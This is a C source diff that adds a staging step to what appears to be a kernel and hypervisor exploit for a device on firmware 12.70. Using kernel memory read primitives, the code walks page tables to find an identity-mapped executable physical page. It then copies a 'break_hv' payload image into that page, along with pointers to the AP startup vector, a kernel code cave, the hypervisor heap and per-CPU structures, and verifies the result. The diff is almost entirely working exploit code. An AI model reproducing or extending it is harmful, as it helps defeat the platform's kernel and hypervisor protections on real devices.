@@ -1,10 +1,12 @@
 #include <inttypes.h>
 #include <stdint.h>
 #include <sys/mman.h>
-#ifdef ANON_HOLD_1270
+#if defined(ANON_HOLD_1270) || defined(ANON_STAGE_1270)
 #include <fcntl.h>
 #include <stdio.h>
 #include <string.h>
+#endif
+#ifdef ANON_HOLD_1270
 #include <time.h>
 #endif
 #include <unistd.h>
@@ -14,6 +16,10 @@
 
 #include "kdlsym.h"
 #include "offsets/12_70_candidate.h"
+#ifdef ANON_STAGE_1270
+#include "khook.h"
+#include "break_hv_payload/break_hv_diag.h"
+#endif
 
 #define FW_1270 0x12700000U
 #define ALLOC_BYTES 0x400000U
@@ -131,7 +137,7 @@ int main(void)
 
   unsigned low = 0, ram = 0, high = 0;
   uint64_t min_pa = UINT64_MAX, max_pa = 0, first_low = 0;
-#ifdef ANON_HOLD_1270
+#if defined(ANON_HOLD_1270) || defined(ANON_STAGE_1270)
   uint8_t *first_low_va = NULL;
 #endif
   int alias_match = 0;
@@ -150,7 +156,7 @@ int main(void)
       ++low;
       if (first_low == 0) {
         first_low = pa;
-#ifdef ANON_HOLD_1270
+#if defined(ANON_HOLD_1270) || defined(ANON_STAGE_1270)
         first_low_va = buffer + i * PAGE_BYTES;
 #endif
         uint8_t observed = 0;
@@ -168,6 +174,70 @@ int main(void)
               ",first_low=0x%016" PRIx64 ",alias_match=%d\n",
               low, ram, high, min_pa, max_pa, first_low, alias_match);
   result = 0;
+
+#ifdef ANON_STAGE_1270
+  if (!first_low_va || !alias_match || break_hv_len == 0 ||
+      break_hv_len > 0x400U) {
+    klog_printf("ANONSTAGE1270,1,stop,stage=candidate-or-image,pa=0x%016" PRIx64
+                ",image_bytes=%u\n", first_low, break_hv_len);
+    result = 1;
+    goto done;
+  }
+  uint64_t ap_pml4e = 0, ap_pdpte = 0, ap_pde = 0;
+  int ap_rc = read64(dmap + 0x68000ULL, &ap_pml4e);
+  if (ap_rc == 0 && (ap_pml4e & 1ULL) && !(ap_pml4e & 0x80ULL) &&
+      (ap_pml4e & FRAME_4K) < RAM_LIMIT)
+    ap_rc = read64(dmap + (ap_pml4e & FRAME_4K), &ap_pdpte);
+  else
+    ap_rc = -1;
+  if (ap_rc == 0 && (ap_pdpte & 1ULL) && !(ap_pdpte & 0x80ULL) &&
+      (ap_pdpte & FRAME_4K) < RAM_LIMIT)
+    ap_rc = read64(dmap + (ap_pdpte & FRAME_4K) +
+                   (((first_low >> 21) & 0x1ffULL) * 8), &ap_pde);
+  else
+    ap_rc = -1;
+  int ap_identity_exec = ap_rc == 0 && (ap_pde & 0x81ULL) == 0x81ULL &&
+      (ap_pde & FRAME_2M) == (first_low & FRAME_2M) &&
+      !((ap_pml4e | ap_pdpte | ap_pde) & (1ULL << 63));
+  klog_printf("ANONSTAGE1270,1,ap-map,pa=0x%016" PRIx64
+              ",pml4e=0x%016" PRIx64 ",pdpte=0x%016" PRIx64
+              ",pde=0x%016" PRIx64 ",identity_exec=%d\n",
+              first_low, ap_pml4e, ap_pdpte, ap_pde, ap_identity_exec);
+  if (!ap_identity_exec) {
+    result = 1;
+    goto done;
+  }
+  int lock_rc = mlock(first_low_va, PAGE_BYTES);
+  if (lock_rc != 0) {
+    klog_printf("ANONSTAGE1270,1,stop,stage=mlock,result=%d\n", lock_rc);
+    result = 1;
+    goto done;
+  }
+  uint64_t oracle = text + g_sym_map_1270[KERNEL_SYM_DATA_CAVE] + KH_OFF_USER;
+  uint64_t params[6] = {
+    text + g_sym_map_1270[KERNEL_SYM_MP_STARTUP_INIT_VECTOR],
+    dmap, oracle, 0x62800000ULL,
+    0x62800000ULL + g_sym_map_1270[HV_SYM_HEAP_BASE],
+    0x62800000ULL + g_sym_map_1270[HV_SYM_PCPUS]
+  };
+  memset(first_low_va, 0, PAGE_BYTES);
+  memcpy(first_low_va, break_hv, break_hv_len);
+  memcpy(first_low_va + 0xF00, params, sizeof(params));
+  uint8_t verify[PAGE_BYTES];
+  int read_rc = kernel_copyout((intptr_t)(dmap + first_low), verify,
+                               sizeof(verify));
+  int match = read_rc == 0 && memcmp(verify, first_low_va, PAGE_BYTES) == 0;
+  klog_printf("ANONSTAGE1270,1,result,pa=0x%016" PRIx64
+              ",va=0x%016" PRIx64 ",image_bytes=%u"
+              ",alias_read=%d,match=%d,param0=0x%016" PRIx64 "\n",
+              first_low, (uint64_t)(uintptr_t)first_low_va, break_hv_len,
+              read_rc, match, params[0]);
+  memset(first_low_va, 0, PAGE_BYTES);
+  int unlock_rc = munlock(first_low_va, PAGE_BYTES);
+  klog_printf("ANONSTAGE1270,1,cleanup,munlock=%d\n", unlock_rc);
+  if (!match || unlock_rc != 0)
+    result = 1;
+#endif
 
 #ifdef ANON_HOLD_1270
   char outcome_path[128];
